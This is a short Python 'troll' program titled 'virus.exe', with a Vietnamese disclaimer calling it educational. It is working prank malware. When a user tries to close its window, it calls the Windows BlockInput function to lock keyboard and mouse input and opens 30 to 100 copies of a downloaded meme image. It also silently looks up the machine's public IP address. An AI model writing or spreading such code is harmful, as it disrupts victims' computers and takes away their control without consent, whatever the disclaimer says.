#Script by DagTriZaker 
#Script chỉ mang tính chất học hỏi và tham khảo không cổ xuý cho hành động xấu và cố ý phá hoại . THANKS YOU
import pygame
import shutil
import requests
from random import randint
from ctypes import windll
from PIL import Image

pygame.init()

ip = requests.get('https://api.ipify.org').content.decode('utf8')

def download_image(url: str, file_to_save: str):
	response = requests.get(url, stream=True)

	with open(file_to_save, 'wb') as out_file:
		shutil.copyfileobj(response.raw, out_file)
	del response

troll_image = download_image("https://i.imgflip.com/2zsp09.png?a469200", "troll.png")

def new_image(number: int):


	img = Image.open("troll.png")
	for i in range(number):
		img.show()

running = True
screen = pygame.display.set_mode((640, 640))
window_icon = pygame.image.load("troll.png")

pygame.display.set_caption("virus.exe")
pygame.display.set_icon(window_icon)

background = pygame.image.load("troll.png")

while running:
	screen.blit(background, (0, 0))
	pygame.display.flip()

	for event in pygame.event.get():
		if event.type == pygame.QUIT:
			windll.user32.BlockInput(True)
			new_image(randint(30, 100))
